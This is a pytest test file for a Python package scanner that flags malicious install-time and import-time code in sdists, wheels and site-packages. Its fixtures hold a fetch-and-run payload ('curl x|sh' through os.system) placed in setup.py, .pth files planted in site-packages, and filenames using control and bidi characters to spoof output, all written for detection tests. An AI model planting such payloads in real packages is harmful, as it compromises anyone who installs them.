"""Regression tests for the code review of the m1-artifact-scan branch."""

import io
import os
import tarfile

import pytest

from buckthorn.code import analyse
from buckthorn.findings import verdict
from buckthorn.scan import scan_sdist, scan_wheel

EVIL = b"import os\nos.system('curl x|sh')\n"
PKG_INFO = b"Name: pkg\nVersion: 1.0\n"


def _tar(path, members):
    with tarfile.open(path, "w:gz") as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return path


def _rules(findings):
    return sorted({f.rule_id for f in findings})


@pytest.mark.parametrize(
    "members",
    [
        {"setup.py": EVIL, "PKG-INFO": PKG_INFO},  # no top folder
        {"./pkg-1.0/setup.py": EVIL, "./pkg-1.0/PKG-INFO": PKG_INFO},
        {"setup.py": EVIL},  # a lone setup.py
    ],
)
def test_sdist_layouts_pip_accepts_still_have_setup_py_read(tmp_path, members):
    findings = scan_sdist(_tar(tmp_path / "pkg-1.0.tar.gz", members))
    assert "BKT-INSTALL-002" in _rules(findings)


def test_module_next_to_setup_py_is_read_as_install_code(make_sdist):
    members = {"setup.py": "import helper\n", "helper.py": EVIL}
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-INSTALL-001", "BKT-INSTALL-002"]


def test_functions_in_a_module_next_to_setup_py_do_not_count(make_sdist):
    members = {
        "setup.py": "",
        "noxfile.py": "import subprocess\ndef lint():\n    subprocess.run('x')\n",
    }
    assert scan_sdist(make_sdist(members)) == []


def test_module_in_a_backend_folder_is_read(make_sdist):
    toml = '[build-system]\nbuild-backend = "be"\nbackend-path = ["_build"]\n'
    members = {"pyproject.toml": toml, "_build/be.py": "import other\n", "_build/other.py": EVIL}
    assert "BKT-INSTALL-002" in _rules(scan_sdist(make_sdist(members)))


@pytest.mark.parametrize("toml", ["build-system = 1\n", '[build-system]\nbackend-path = "x"\n'])
def test_odd_build_system_tables_do_not_crash(make_sdist, toml):
    findings = scan_sdist(make_sdist({"pyproject.toml": toml}))
    assert verdict(findings) in ("clean", "not_verified")


def test_build_system_that_is_not_a_table_is_not_verified(make_sdist):
    findings = scan_sdist(make_sdist({"pyproject.toml": "build-system = 1\n"}))
    assert verdict(findings) == "not_verified"


def test_exec_of_a_file_written_at_run_time_counts_in_a_wheel(make_wheel):
    source = "open('/tmp/p', 'w').write(x)\nexec(open('/tmp/p').read())\n"
    assert _rules(scan_wheel(make_wheel({"pkg/__init__.py": source}))) == ["BKT-IMPORT-003"]


def test_exec_of_a_file_the_sdist_does_not_have_counts(make_sdist):
    setup = "exec(open('/tmp/p').read())\n"
    assert _rules(scan_sdist(make_sdist({"setup.py": setup}))) == ["BKT-INSTALL-003"]


def test_exec_of_a_file_read_from_a_variable_counts():
    assert {h.kind for h in analyse("exec(open(path).read())", True)} == {"exec"}


@pytest.mark.parametrize(
    "member",
    [
        "pkg-1.0.data/data/lib/python3.12/site-packages/evil.pth",
        "pkg-1.0.data/data/Lib/site-packages/evil.pth",
    ],
)
def test_pth_through_the_data_scheme_lands_in_site_packages(make_wheel, member):
    findings = scan_wheel(make_wheel({member: "import sys; sys.modules['x'] = 1\n"}))
    assert _rules(findings) == ["BKT-PTH-002"]


def test_exec_literal_functions_do_not_count_at_import():
    source = "exec('def f():\\n    import os; os.system(\"x\")')\n"
    assert analyse(source, True) == []
    assert {h.kind for h in analyse(source, False)} == {"process"}


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no FIFOs on Windows")
def test_unreadable_unowned_file_does_not_crash_env(tmp_path):
    from buckthorn.env import scan_env

    site = tmp_path / "site-packages"
    site.mkdir()
    (site / "x-1.0.dist-info").mkdir()
    fifo = site / "pipe.pth"
    os.mkfifo(fifo)  # opening it would block forever
    from buckthorn.env import UNOWNED

    (result,) = [r for r in scan_env(site) if r.path == UNOWNED]
    assert "pipe.pth" in {f.file_path for f in result.findings}


def test_unowned_findings_cannot_be_allowlisted_by_a_guessed_name(tmp_path, capsys):
    import json

    from buckthorn.cli import main

    site = tmp_path / "site-packages"
    site.mkdir()
    (site / "x-1.0.dist-info").mkdir()
    (site / "dropped.pth").write_text("import sys; sys.modules['x'] = 1\n")
    allow = tmp_path / "allow.json"
    allow.write_text(
        json.dumps({"allow": [{"rule": "BKT-PTH-002", "package": "site", "reason": "x"}]})
    )
    assert main(["env", "--allow-not-verified", "--allowlist", str(allow), str(site)]) == 1


# Security review


def test_tar_member_cap_counts_every_header(tmp_path, monkeypatch):
    from buckthorn import scan

    monkeypatch.setattr(scan, "MAX_MEMBERS", 3)
    path = tmp_path / "pkg-1.0.tar.gz"
    with tarfile.open(path, "w:gz") as tf:
        for n in range(10):
            info = tarfile.TarInfo(f"pkg-1.0/d{n}")
            info.type = tarfile.DIRTYPE
            tf.addfile(info)
    assert [f.rule_id for f in scan.read_archive(path)[1]] == ["BKT-SKIP-002"]


def test_text_output_escapes_control_characters(make_wheel, capsys):
    from buckthorn.cli import main

    name = "evil\r  BKT-NOTHING clean\x1b[2K.pth"
    main(["scan", str(make_wheel({name: "import sys; sys.modules['x'] = 1\n"}))])
    out = capsys.readouterr().out
    assert "\r" not in out and "\x1b" not in out
    assert "\\r" in out


@pytest.mark.parametrize("char", ["\u202e", "\u2066", "\u200f", "\u061c", "\u2028"])
def test_text_output_escapes_direction_and_line_controls(make_wheel, capsys, char):
    """U+202E shows "evil.pth" as "evil" plus "htp." reversed, so a name can read as another."""
    from buckthorn.cli import main

    main(["scan", str(make_wheel({f"evil{char}.pth": "import sys; sys.modules['x'] = 1\n"}))])
    out = capsys.readouterr().out
    assert char not in out
    assert repr(char)[1:-1] in out


def test_cache_write_does_not_follow_a_planted_link(tmp_path, make_wheel):
    import hashlib

    from buckthorn import lock

    data = make_wheel({"pkg/__init__.py": ""}).read_bytes()
    sha = hashlib.sha256(data).hexdigest()
    victim = tmp_path / "victim.txt"
    victim.write_text("keep me")
    cache = tmp_path / "cache"
    (cache / sha).mkdir(parents=True)
    (cache / sha / "pkg-1.0-py3-none-any.whl").symlink_to(victim)
    url = "https://files.pythonhosted.org/packages/aa/pkg-1.0-py3-none-any.whl"
    result = lock._fetch_and_scan("pkg-1.0-py3-none-any.whl", sha, url, lambda u, n: data, cache)
    assert result.verdict == "clean"
    assert victim.read_text() == "keep me"
